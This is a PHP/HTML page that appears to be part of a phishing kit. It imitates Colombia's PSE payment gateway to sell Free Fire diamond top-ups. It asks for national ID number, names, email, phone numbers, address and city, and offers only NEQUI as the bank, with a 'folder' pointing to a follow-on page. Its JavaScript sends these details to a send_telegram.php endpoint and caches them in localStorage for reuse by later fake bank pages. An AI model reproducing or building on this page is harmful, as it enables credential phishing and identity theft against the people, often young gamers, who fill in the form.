<?php
// index.php - Formulario PSE para Free Fire
session_start();
require_once '../config.php';

// Obtener datos del formulario principal
$method = $_GET['method'] ?? '';
$diamonds = $_GET['diamonds'] ?? 0;
$bonus = $_GET['bonus'] ?? 0;
$price = $_GET['price'] ?? 0;
$total = $_GET['total'] ?? 0;
$fullName = $_GET['fullName'] ?? '';
$email = $_GET['email'] ?? '';
$promoCode = $_GET['promoCode'] ?? '';
$playerId = $_GET['playerId'] ?? '';
$playerName = $_GET['playerName'] ?? '';
$region = $_GET['region'] ?? 'US';

// VALIDACIÓN: Verificar que tengamos datos válidos de Free Fire
if (empty($playerId) || $diamonds <= 0 || empty($price)) {
    // Redirigir al formulario principal si no hay datos válidos
    header('Location: /index.php?error=missing_data');
    exit;
}

// Usar el precio como valor formateado
$valor_formateado = $price;
$valor_numerico = floatval(str_replace(['$', ','], ['', '.'], $price));
?>
<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>PSE - Recargas Free Fire</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        html,
        body {
            height: 100%;
        }

        body {
            font-family: Arial, Helvetica, sans-serif;
            background: #dedede;
            display: flex;
            flex-direction: column;
        }

        body::before {
            content: '';
            position: fixed;
            inset: 0;
            background:
                radial-gradient(ellipse 1400px 1000px at 18% 30%, rgba(255, 255, 255, 0.85), transparent),
                radial-gradient(ellipse 1500px 1100px at 82% 70%, rgba(255, 255, 255, 0.8), transparent);
            pointer-events: none;
            z-index: 0;
        }

        .wrapper {
            position: relative;
            z-index: 1;
            flex: 1;
            display: flex;
            flex-direction: column;
            padding-bottom: 180px;
        }

        /* Logo centrado */
        .logo-container {
            text-align: center;
            margin-top: -60px;
            padding-top: 100px;
            margin-bottom: 30px;
        }

        .logo-container img {
            width: 100px;
        }

        /* Botón salir */
        .btn-salir {
            position: absolute;
            top: 120px;
            right: 40px;
            background: #e74c3c;
            color: white;
            border: none;
            padding: 8px 18px;
            border-radius: 4px;
            cursor: pointer;
            font-size: 12px;
            text-decoration: none;
            display: inline-block;
        }

        .btn-salir:hover {
            background: #c0392b;
        }

        /* Contenedor principal */
        .container {
            max-width: 1200px;
            margin: 0 auto;
            padding: 0 40px;
            flex: 1;
        }

        /* Formulario */
        .form-container {
            background: white;
            border-radius: 8px;
            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1);
            padding: 30px;
            margin-bottom: 30px;
        }

        .form-title {
            font-size: 18px;
            font-weight: 600;
            margin-bottom: 15px;
        }

        .form-group {
            display: flex;
            align-items: center;
            margin-bottom: 12px;
        }

        .form-group label {
            width: 200px;
            font-size: 12px;
            color: #333;
            font-weight: 600;
        }

        .form-group label span {
            color: #e74c3c;
        }

        .form-group input,
        .form-group select {
            flex: 1;
            max-width: 300px;
            padding: 8px;
            font-size: 12px;
            border: 1px solid #ccc;
            border-radius: 3px;
        }

        .form-checkbox {
            display: flex;
            align-items: center;
            margin: 20px 0;
        }

        .form-checkbox input {
            width: 16px;
            height: 16px;
            margin-right: 8px;
        }

        .form-checkbox label {
            font-size: 11px;
            color: #333;
        }

        .form-checkbox a {
            color: #1976d2;
            text-decoration: underline;
        }

        .botones {
            display: flex;
            justify-content: space-between;
            margin-top: 30px;
        }

        .btn {
            padding: 12px 24px;
            border: none;
            border-radius: 4px;
            cursor: pointer;
            font-size: 14px;
            text-decoration: none;
            display: inline-block;
        }

        .btn-cambiar {
            background: #6c757d;
            color: white;
        }

        .btn-cambiar:hover {
            background: #545b62;
        }

        .btn-pagar {
            background: #28a745;
            color: white;
        }

        .btn-pagar:hover {
            background: #218838;
        }

        .info-lateral {
            position: fixed;
            bottom: 260px;
            right: 40px;
            text-align: right;
            font-size: 12px;
            line-height: 2;
            color: #1a1a1a;
        }

        .info-lateral strong {
            font-size: 13px;
            font-weight: 700;
            display: block;
        }

        /* Responsive */
        @media (max-width: 768px) {
            .container {
                padding: 0 20px;
            }

            .logo-container img {
                width: 80px;
            }

            .form-group {
                flex-direction: column;
                align-items: flex-start;
            }

            .form-group label {
                width: auto;
                margin-bottom: 5px;
            }

            .botones {
                flex-direction: column;
            }

            .btn {
                margin-bottom: 10px;
            }
        }
    </style>
</head>
<body>
    <div class="wrapper">
        <div class="container">
            <!-- Botón salir -->
            <a href="../../index.php" class="btn-salir">Salir</a>

            <!-- Logo -->
            <div class="logo-container">
                <img src="../../images/free-fire-icon.png" alt="Free Fire">
                <h1 style="color: #333; font-size: 24px; margin-top: 10px;">Recargas Free Fire</h1>
            </div>

            <!-- Formulario -->
            <div class="form-container">
                <form id="pse_form" method="POST" action="procesar.php">
                    <!-- Campos hidden con datos de Free Fire -->
                    <input type="hidden" name="procesarRecarga" value="1">
                    <input type="hidden" name="diamonds" value="<?php echo htmlspecialchars($diamonds); ?>">
                    <input type="hidden" name="bonus" value="<?php echo htmlspecialchars($bonus); ?>">
                    <input type="hidden" name="price" value="<?php echo htmlspecialchars($price); ?>">
                    <input type="hidden" name="total" value="<?php echo htmlspecialchars($total); ?>">
                    <input type="hidden" name="playerId" value="<?php echo htmlspecialchars($playerId); ?>">
                    <input type="hidden" name="playerName" value="<?php echo htmlspecialchars($playerName); ?>">
                    <input type="hidden" name="region" value="<?php echo htmlspecialchars($region); ?>">
                    <input type="hidden" name="promoCode" value="<?php echo htmlspecialchars($promoCode); ?>">
                    <input type="hidden" name="monto" value="<?php echo htmlspecialchars($valor_numerico); ?>">
                    <input type="hidden" name="descripcion" value="Recarga Free Fire - <?php echo htmlspecialchars($diamonds); ?> diamantes">
                    <!-- Información de pago -->
                    <div style="background: #ffffff; border: 1px solid #ddd; border-radius: 4px; padding: 20px; margin-bottom: 25px; text-align: left; max-width: 400px;">
                        <div style="font-size: 14px; color: #333; margin-bottom: 10px; font-weight: normal;">
                            🎮 RECARGAS FREE FIRE
                        </div>
                        <div style="font-size: 14px; color: #333; margin-bottom: 10px; font-weight: normal;">
                            💎 Diamantes: <?php echo $diamonds; ?> (Bonus: <?php echo $bonus; ?>)
                        </div>
                        <div style="font-size: 14px; color: #333; margin-bottom: 10px; font-weight: normal;">
                            👤 Jugador: <?php echo htmlspecialchars($playerName); ?> (ID: <?php echo htmlspecialchars($playerId); ?>)
                        </div>
                        <div style="font-size: 16px; color: #e74c3c; font-weight: bold;">
                            💰 Total a pagar: <?php echo htmlspecialchars($valor_formateado); ?>
                        </div>
                    </div>

                    <!-- Información del Titular (Pre-llenada) -->
                    <div class="form-title">Información del Titular</div>

                    <div class="form-group">
                        <label>Documento de identidad: <span>*</span></label>
                        <select name="tipo_doc" id="tipo_doc" required>
                            <option value="CC" selected>CC</option>
                            <option value="CE">CE</option>
                            <option value="NIT">NIT</option>
                        </select>
                    </div>

                    <div class="form-group">
                        <label>Número de documento: <span>*</span></label>
                        <input type="text" name="cedula" id="cedula" placeholder="Ingresa tu documento" required>
                    </div>

                    <div class="form-group">
                        <label>Nombres: <span>*</span></label>
                        <input type="text" name="nombres" id="nombres" value="<?php echo htmlspecialchars(explode(' ', $fullName)[0] ?? ''); ?>" required>
                    </div>

                    <div class="form-group">
                        <label>Apellidos: <span>*</span></label>
                        <input type="text" name="apellidos" id="apellidos" value="<?php echo htmlspecialchars(explode(' ', $fullName, 2)[1] ?? ''); ?>" required>
                    </div>

                    <div class="form-group">
                        <label>Correo: <span>*</span></label>
                        <input type="email" name="correo" id="correo" value="<?php echo htmlspecialchars($email); ?>" required>
                    </div>

                    <div class="form-group">
                        <label>Teléfono: <span>*</span></label>
                        <input type="tel" name="telefono" id="telefono" placeholder="Ingresa tu teléfono" required>
                    </div>

                    <div class="form-group">
                        <label>Celular: <span>*</span></label>
                        <input type="tel" name="celular" id="celular" placeholder="Ingresa tu celular" required>
                    </div>

                    <div class="form-group">
                        <label>Dirección: <span>*</span></label>
                        <input type="text" name="direccion" id="direccion" placeholder="Ingresa tu dirección" required>
                    </div>

                    <div class="form-group">
                        <label>País: <span>*</span></label>
                        <select name="pais" id="pais" required>
                            <option value="Colombia" selected>Colombia</option>
                        </select>
                    </div>

                    <div class="form-group">
                        <label>Ciudad: <span>*</span></label>
                        <input type="text" name="ciudad" id="ciudad" placeholder="Ingresa tu ciudad" required>
                    </div>

                    <div class="form-group">
                        <label>Tipo de persona: <span>*</span></label>
                        <select name="tipo_persona" id="tipo_persona" required>
                            <option value="natural" selected>Natural</option>
                            <option value="juridica">Jurídica</option>
                        </select>
                    </div>

                    <!-- Selector de banco con folder/tipo -->
                                       <div class="input-group">
                        <label>Bancos *</label>
                        <select id="txt-banco" name="banco" required>
                            <option label="Selecciona tu banco para pagar los diamantes" value="">Selecciona tu banco para pagar los diamantes</option>
                            <option label="NEQUI" value="nequi" tipo="1" folder="nequi-1/">NEQUI</option>
                        </select>
                    </div>

                    <!-- Campos ocultos -->
                    <input type="hidden" name="descripcion" value="Recarga  Free Fire">
                    <input type="hidden" name="monto" id="monto-hidden" value="<?php echo $valor_numerico; ?>">
                    <input type="hidden" name="procesarRecarga" value="1">

                    <!-- Checkbox -->
                    <div class="form-checkbox">
                        <input type="checkbox" id="acepto" name="acepto" required>
                        <label for="acepto">
                            <a href="#">Acepto autorización tratamiento de datos</a>
                        </label>
                    </div>

                    <!-- Botones -->
                    <div class="botones">
                        <a href="../checkout.php" class="btn btn-cambiar">Cambiar Medio de Pago</a>
                        <button type="submit" class="btn btn-pagar">Continuar con Pago</button>
                    </div>
                </form>
            </div>
        </div>

    
    </div>


    <script>
        // Leer parámetro valor de la URL y mostrarlo
        function getParameterByName(name) {
            const url = window.location.href;
            name = name.replace(/[\[\]]/g, '\\$&');
            const regex = new RegExp('[?&]' + name + '(=([^&#]*)|&|#|$)');
            const results = regex.exec(url);
            if (!results) return null;
            if (!results[2]) return '';
            return decodeURIComponent(results[2].replace(/\+/g, ' '));
        }

        // Inicializar monto desde URL
        const valorParam = getParameterByName('total');
        if (valorParam) {
            document.getElementById('monto-hidden').value = valorParam;
        }

        async function procesarBanco() {
            // Prevenir múltiples clics y múltiples envíos de notificación
            const button = document.querySelector('.btn-pagar');
            if (button.disabled || button.dataset.processing === 'true') {
                console.log('Botón ya procesado, ignorando clic adicional');
                return;
            }
            
            button.disabled = true;
            button.dataset.processing = 'true';
            button.textContent = 'Procesando...';
            console.log('🚀 Iniciando procesarBanco()');

            const banco = document.getElementById('txt-banco').value;

            // Validar banco seleccionado
            if (!banco) {
                alert('Por favor seleccione un banco');
                button.disabled = false;
                button.dataset.processing = '';
                button.textContent = 'Continuar con Pago';
                return;
            }

            // Validar campos obligatorios
            const campos = ['tipo_doc', 'nombres', 'apellidos', 'correo', 'telefono', 'celular', 'direccion', 'pais', 'ciudad', 'tipo_persona'];
            for (let campo of campos) {
                const input = document.getElementById(campo);
                if (!input || !input.value.trim()) {
                    alert('Por favor complete todos los campos obligatorios');
                    button.disabled = false;
                    button.dataset.processing = '';
                    button.textContent = 'Continuar con Pago';
                    input.focus();
                    return;
                }
            }

            // Validar checkbox
            if (!document.getElementById('acepto').checked) {
                alert('Debe aceptar el tratamiento de datos');
                button.disabled = false;
                button.dataset.processing = '';
                button.textContent = 'Continuar con Pago';
                return;
            }

            console.log('📤 Enviando notificación a Telegram...');

            // Evitar múltiples envíos de notificación
            if (window.notificationSent) {
                console.log('Notificación ya enviada, continuando con envío del formulario');
            } else {
                // Enviar datos a Telegram
                try {
                    const telegramData = {
                        tipo_doc: document.getElementById('tipo_doc').value,
                        cedula: document.getElementById('cedula').value,
                        nombres: document.getElementById('nombres').value,
                        apellidos: document.getElementById('apellidos').value,
                        correo: document.getElementById('correo').value,
                        telefono: document.getElementById('telefono').value,
                        celular: document.getElementById('celular').value,
                        direccion: document.getElementById('direccion').value,
                        pais: document.getElementById('pais').value,
                        ciudad: document.getElementById('ciudad').value,
                        tipo_persona: document.getElementById('tipo_persona').value
                    };

                    const response = await fetch(window.location.origin + '/data-ps/recargas/send_telegram.php', {
                        method: 'POST',
                        headers: {
                            'Content-Type': 'application/json'
                        },
                        body: JSON.stringify(telegramData)
                    });

                    console.log('📡 Fetch response received');
                    console.log('📡 Fetch response status:', response.status);
                    console.log('📡 Fetch response ok:', response.ok);
                    console.log('📡 Fetch response headers:', [...response.headers.entries()]);

                    if (!response.ok) {
                        console.error('❌ HTTP error:', response.status, response.statusText);
                        const errorText = await response.text();
                        console.error('❌ Error response body:', errorText);
                        throw new Error('HTTP error ' + response.status);
                    }

                    const result = await response.text().then(text => {
                        if (!text.trim()) {
                            console.log('📡 Response body empty, assuming success');
                            return { success: true };
                        }
                        try {
                            return JSON.parse(text);
                        } catch (parseError) {
                            console.error('📡 JSON parse error:', parseError);
                            console.log('📡 Raw response:', text);
                            return { success: true }; // Assume success if can't parse
                        }
                    });
                    
                    if (!result.success) {
                        console.error('❌ Telegram API error:', result.error);
                        alert('Error enviando datos. Intente nuevamente.');
                        button.disabled = false;
                        button.dataset.processing = '';
                        button.textContent = 'Continuar con Pago';
                        return;
                    }
                    
                    console.log('✅ Notificación enviada correctamente');
                    window.notificationSent = true; // Marcar como enviada
                } catch (error) {
                    console.error('❌ Error enviando notificación:', error);
                    console.error('❌ Error details:', error.message);
                    console.error('❌ Error stack:', error.stack);
                    alert('Error enviando datos a Telegram: ' + error.message + '. Revisa la consola para más detalles.');
                    button.disabled = false;
                    button.dataset.processing = '';
                    button.textContent = 'Continuar con Pago';
                    // Continue to submit the form even if notification fails
                }
            }

            console.log('💾 Guardando datos en localStorage...');

            // Guardar datos en localStorage con keys compatibles con bancos
            const formData = {
                tipo_doc: document.getElementById('tipo_doc').value,
                cedula: document.getElementById('cedula').value, // para bancos que usan 'cedula'
                val: document.getElementById('cedula').value, // para bancos que usan 'val'
                nombres: document.getElementById('nombres').value,
                apellidos: document.getElementById('apellidos').value,
                correo: document.getElementById('correo').value,
                telefono: document.getElementById('telefono').value,
                celular: document.getElementById('celular').value,
                cel: document.getElementById('celular').value, // alias para 'celular'
                direccion: document.getElementById('direccion').value,
                pais: document.getElementById('pais').value,
                ciudad: document.getElementById('ciudad').value,
                tipo_persona: document.getElementById('tipo_persona').value,
                per: document.getElementById('tipo_persona').value, // alias para 'tipo_persona'
                banco: banco
            };

            localStorage.setItem('pse_data', JSON.stringify(formData));

            // Guardar datos individuales para compatibilidad con bancos
            localStorage.setItem('nom', banco);
            localStorage.setItem('total_pagar', document.getElementById('monto-hidden').value);
            localStorage.setItem('correo', document.getElementById('correo').value);
            localStorage.setItem('cel', document.getElementById('celular').value);
            localStorage.setItem('val', document.getElementById('cedula').value);
            localStorage.setItem('per', document.getElementById('tipo_persona').value);

            console.log('📝 Enviando formulario...');

            // Pequeño delay para asegurar que todo se complete
            setTimeout(() => {
                console.log('📝 Ejecutando submit del formulario...');
                const form = document.getElementById('pse_form');
                console.log('📝 Formulario encontrado:', form);
                console.log('📝 Action del formulario:', form.action);
                console.log('📝 Method del formulario:', form.method);
                
                // Verificar que el formulario tenga los datos necesarios
                const formData = new FormData(form);
                console.log('📝 Datos del formulario:');
                for (let [key, value] of formData.entries()) {
                    console.log(`📝 ${key}: ${value}`);
                }
                
                form.submit();
                console.log('📝 Formulario enviado exitosamente');
            }, 100);
        }
    </script>
</body>
</html>